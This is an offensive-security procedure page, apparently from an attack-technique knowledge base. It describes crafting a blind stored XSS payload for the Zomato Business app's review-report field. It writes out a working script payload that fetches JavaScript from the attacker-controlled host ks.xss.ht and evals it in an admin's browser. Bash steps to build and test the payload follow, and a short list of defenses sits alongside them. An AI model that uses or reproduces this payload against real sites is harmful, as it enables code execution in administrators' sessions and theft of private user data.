---
tags:
  - xss
  - payload-craft
  - csp-bypass
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/validate-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:39.106Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: b6d3a469-8e40-481c-9c03-20e6f42f6dc6
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Prepare-XSS-Payload-for-Review-Report

## Summary

This procedure crafts a blind stored XSS payload for the Zomato Business app's review reporting feature, using a script that loads and evaluates an external JavaScript file via XMLHttpRequest to bypass Content Security Policy (CSP).

## Description

In the attack scenario, the additional_text field in review reports is stored without sanitization and rendered as HTML on the admin panel at /reviews_new. The payload exploits unsafe-inline CSP permissions by avoiding direct script src attributes and instead using XMLHttpRequest to fetch and eval code from an attacker-controlled domain like ks.xss.ht. This allows arbitrary JS execution in the admin's browser context, enabling potential theft of private user data via subsequent AJAX requests. Prerequisites include a valid review ID and access token.

## Requirements

1. Valid Zomato API access token
2. Knowledge of a reportable review ID (e.g., 32288944)
3. Attacker-controlled external domain for script hosting (e.g., ks.xss.ht)

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs, especially additional_text, using HTML entity encoding or libraries like DOMPurify
- Implement strict CSP without unsafe-inline; block external XMLHttpRequest to untrusted domains
- Monitor admin panel logs for anomalous JS execution or external fetches

## Objectives

1. Create a functional XSS payload that evades basic filters
2. Ensure CSP bypass for external code execution
3. Prepare for storage and triggering in admin context

## Instructions

### Step 1: Define the Payload Structure

**Context**: Construct the core JavaScript that uses XMLHttpRequest to load and eval an external script, avoiding direct <script src> to bypass CSP.

**Command** ([[commands/validate-xss-payload]]):
```bash
# No direct command; manually construct or use a script to validate
payload='<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>'
echo $payload | grep -q 'XMLHttpRequest' && echo 'Payload valid'
```

> This constructs the payload string. Expected output: Confirmation of key elements like XMLHttpRequest presence. Test in a local HTML file to ensure it loads external content without CSP blocks.

### Step 2: Test Payload in Isolation

**Context**: Verify the payload executes correctly in a browser environment simulating the admin panel.

**Command** ([[commands/validate-xss-payload]]):
```bash
# Create a test HTML file
cat > test.html << EOF
<!DOCTYPE html><html><body><div id="report">$payload</div><script>document.getElementById('report').innerHTML = document.getElementById('report').innerHTML;</script></body></html>
EOF
# Open in browser and check console/network
```

> Expected output: Browser console shows eval execution and network request to //ks.xss.ht. Success if no CSP errors and script loads.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/validate-xss-payload]]

## Tools Used


## Tags

- [[xss]]
- [[payload-craft]]
